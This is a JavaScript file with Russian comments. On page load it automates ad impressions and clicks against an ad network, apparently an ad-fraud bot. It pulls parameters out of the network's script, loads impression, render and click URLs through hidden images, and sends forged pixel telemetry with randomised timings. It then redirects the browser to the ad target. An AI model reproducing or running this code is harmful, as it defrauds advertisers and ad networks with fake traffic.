async function setRequest(url, params={}) {
    try {
        const response = await fetch(url, params);
        let data = await response.text();
        return data;
        
    } catch (error) {
        console.error(error);
        throw error
    }
}
async function getFile(url) {
    return new Promise((resolve, reject) => {
        let xhr = new XMLHttpRequest();
        xhr.open('GET', url, true);
        xhr.send();

        xhr.onload = (e) => {
            if(xhr.status == 200) {
                console.log('СТАТУС 200');
                console.log(xhr.response.length);
                resolve(xhr.response.length);
            } else {
                console.log(`Ошибка ${xhr.status}`);
                reject('ERROR');
            }
        };
        xhr.onerror = (e) => {
            console.log('Ошибка при запросе получения размера файлов...');
            reject('ERROR');
        }
        
    });
}
async function requestStatistics(url) {

    url += '/stats';

    return await setRequest(url);
}
function randomFloatNumber(min, max) {
    min = Math.ceil(min);
    max = Math.floor(max);
    return Number(Math.floor(Math.random() * (max - min + 1)) + min).toFixed(1); //Максимум и минимум включаются
}
// Функция с промисом для ожидания перед следующим запросом 
function delay(refresh_time) {
    return new Promise(resolve => setTimeout(resolve, refresh_time));
}

window.onload = async () => {

    (async function ad(key='e902c8ac42c6171f9d4712d725100b95', arr_count=[1, 3], arr_time=[1, 3]) {
        try {

            const count = Number(randomFloatNumber(arr_count[0], arr_count[1])).toFixed(0);
            let arrCount = [];
            for (let i=0; i < count; i++) {
                arrCount.push(i);
            }

            const mainUrl = `https://pl16831528.trustedcpmrevenue.com/${key.substring(0, 2)}/${key.substring(2, 4)}/${key.substring(4, 6)}/${key}.js`;
    
            let text = await setRequest(mainUrl);
    
            // Находим adsDomain
            const regAdsDomain = /'[a-z]*\.[a-z]+'/;
            const adsDomain = text.match(regAdsDomain)[0].replace(/'/g, '');
    
            // Находим bv
            const regBv = /\d{2}\.\d{2}\.\d{4}/;
            const bv = text.match(regBv)[0];
    
            // Находим template
            const regTemplate = /'\d{3}'/g;
            const template = text.match(regTemplate)[0].replace(/'/g, '');
    
            console.log('Нашли все параметры ...');
    
            // Получаем uuid
            const uuid = await requestStatistics(`https://venetrigni.com`);
    
            console.log('Получиди uuid ...');

            let clickUrl = '';
            let url = '';

            for (let rww of arrCount) {
                // Получаем JSON sbar со ссылками
                const sbar = JSON.parse(await setRequest(`https://${adsDomain}/sbar.json?key=${key}&uuid=${uuid}`));
                if (sbar) {
                    if (sbar.length > 0) {
        
                        console.log('Получили список ссылок и он не пустой ...');
        
                        // Запрос показа на sbar[0].ren
                        const ren = sbar[0].ren;
                        const urlRen = `https://${adsDomain}${ren}?`;
                        let iconRen = document.createElement("img");
                        iconRen.style.visibility = 'hidden';
                        iconRen.src = urlRen
                        document.body.appendChild(iconRen);
        
                        console.log('Сделали запрос на REN ...');
        
                        // Запрос показа на sbar[0].ren
                        const impr = sbar[0].impr;
                        const urlImpr = `https://${adsDomain}${impr}`;
                        let iconImpr = document.createElement("img");
                        iconImpr.style.visibility = 'hidden';
                        iconImpr.src = urlImpr
                        document.body.appendChild(iconImpr);
        
                        console.log('Сделали запрос на IMPR ...');
        
                        // Загрузка кода. Добавляем параметр, чтобы не кэшировался ответ.
                        let cuUrl = sbar[0].cu;
                        let cu = cuUrl + '?x=' + new Date().getTime();
                        const code = await setRequest(cu)
        
                        console.log('Получили файл HTML ...');
        
                        const regLink = /\/\/src_domain.+\.css"/g;
                        const links = Array.from(code.matchAll(regLink));
        
                        const regScript = /\/\/src_domain.+\.js"/g;
                        const scripts = Array.from(code.matchAll(regScript));
        
                        let arrScriptsAndLinks = [...links, ...scripts];
        
                        console.log('Извлекли ссылки на файлы JS и CSS ...');
        
                        console.log(arrScriptsAndLinks);
        
                        // Определяем домен с которого нужно запрашивать файлы
                        let regMailUrl = /https.+\.com/;
                        let mainUrl = String(cuUrl).match(regMailUrl)[0];
        
                        for (let row of arrScriptsAndLinks) {
                            let resource = row[0].replace(/"/g, '');
        
                            // Создаем ссылку и получаем размер
                            let url = resource.replace('//src_domain', mainUrl);
                            const sizeFile = await getFile(url);
        
                            // делаем запрос по параметрам
                            let urlParams = `https://${adsDomain}/pixel/sbls?bv=${bv}&tmpl=${template}&l=${sizeFile}&u="${url}"&fd=${randomFloatNumber(200, 800)}`;
                            await setRequest(urlParams);
        
                            console.log('Итерация цикла ... ');
        
                        }
        
                        // Узнаем размер файла и делаем запрос по параметрам
                        const sizeFile = await getFile(cu);
                        let urlParams = `https://${adsDomain}/pixel/sbls?bv=${bv}&tmpl=${template}&l=${sizeFile}&u="${cu}"&fd=${randomFloatNumber(200, 800)}`;
                        await setRequest(urlParams);
        
                        console.log('Сделали запросы с параметрами ...');
        
                        // Запрос на adsDomain/pixel/sbs?c=1
                        await setRequest(`https://${adsDomain}/pixel/sbs?c=1`);
        
                        console.log('Сделали запрос c=1 ...');
        
                        // Регистрация клика
                        clickUrl = `https://${adsDomain}${sbar[0].clk}`;
                        url = sbar[0].url

                        // Делаем остановку на сколько то милисикунд
                        const time = Number(randomFloatNumber(arr_time[0], arr_time[1])).toFixed(0);
                        await delay(time);

                    }
                }
            }

            if (clickUrl) {
                let iconClk = document.createElement("img");
                iconClk.style.visibility = 'hidden';
                iconClk.src = clickUrl
                document.body.appendChild(iconClk);
            }
            if (url) {
                window.location.href = url;
            }

        } catch(e) {
            console.error(e);
            alert('EROR');
        }
    })();

}
